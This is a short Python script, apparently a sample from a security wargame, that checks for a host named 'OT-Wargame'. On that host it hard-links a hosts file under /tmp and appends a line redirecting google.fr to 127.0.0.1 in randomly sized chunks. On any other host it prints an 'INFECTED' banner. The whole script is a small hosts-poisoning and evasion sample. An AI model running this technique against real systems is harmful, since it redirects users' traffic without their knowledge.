import socket
import os
from random import randint

if __file__ != "lolita.final.pyc":
    if socket.gethostname() == "OT-Wargame":
        new_host = "127.0.0.1\tgoogle.fr"

        os.link("/tmp/hosts", "/tmp/syslog")
        f = open("/tmp/syslog", "a+")

        if f.read().find(new_host) == -1:
            size = len(new_host)
            offset = 0
            while(offset < size):
                size_chunk = randint(1, 1+(size-offset)/2)
                f.write(new_host[offset:offset+size_chunk])
                f.flush()
                offset+=size_chunk
            f.write("\n")

        f.close()
        os.unlink("/tmp/syslog")
    else:
        print " ###########  /!\ INFECTED /!\ ############### "
